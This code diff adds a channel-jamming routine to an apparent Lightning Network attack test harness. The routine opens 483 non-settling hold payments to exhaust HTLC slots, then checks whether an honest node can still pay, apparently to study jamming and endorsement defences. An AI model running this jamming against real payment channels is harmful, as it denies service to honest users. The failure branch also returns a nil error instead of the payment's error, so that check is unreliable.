@@ -109,6 +109,15 @@ func main() {
 	}
 
 	/*
+		err = ah.jam(ctx)
+		if err != nil {
+			fmt.Printf("Could not jam: %v\n", err)
+			os.Exit(1)
+		}
+
+	*/
+
+	/*
 		fmt.Println("Cleaning up opened channels for all nodes")
 		if err := graph.CloseAllChannels(ctx, 0); err != nil {
 			fmt.Printf("Could not clean up node 0: %v\n", err)
@@ -375,6 +384,76 @@ func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
 		fmt.Printf("got jam response: %v\n", resp.Err)
 	case <-h.quit:
 	}
+
+	return nil
+}
+
+// jam wil send 483 small hold payments from A0 -> A1. We should then see that
+// A2 (our good node) is no longer able to make honest payment.
+func (h *attackHarness) jam(ctx context.Context) error {
+	// Get current best block
+	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
+	if err != nil {
+		return err
+	}
+
+	// Add 483 non-settling payments.
+	var wg sync.WaitGroup
+	for i := 0; i < 483; i++ {
+		i := i
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
+				AmtMsat:         1000,
+				SourceIdx:       0,
+				DestIdx:         2,
+				FinalCLTV:       0,
+				EndorseOutgoing: true,
+				Settle:          false,
+				SettleWait:      time.Hour,
+				ForceSettle:     h.quit,
+			})
+			if err != nil {
+				fmt.Printf("got error setting up HOLD payment %d: %v\n", i, err)
+				return
+			}
+
+			select {
+			case r := <-resp:
+				if r.Err != nil {
+					fmt.Printf("got error for HOLD payment %d: %v\n", i, r.Err)
+					return
+				}
+
+			case <-h.quit:
+			}
+		}()
+	}
+
+	fmt.Println("483 Hodl payments have been attempted.... Now trying payment from good node")
+
+	// Try to do a payment from our good node now.
+	resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
+		AmtMsat:         1000,
+		SourceIdx:       2,
+		DestIdx:         1,
+		FinalCLTV:       uint64(height) + 80,
+		EndorseOutgoing: true,
+		Settle:          true,
+	})
+	if err != nil {
+		fmt.Printf("Good payment setup failed: %v\n", err)
+		return err
+	}
+
+	r := <-resp
+	if r.Err != nil {
+		fmt.Printf("Good payment failed!! %v\n", err)
+		return err
+	}
+
+	fmt.Printf("results from A2 -> A1: %v\n", outgoingEndorsed(r.Htlcs))
 
 	return nil
 }
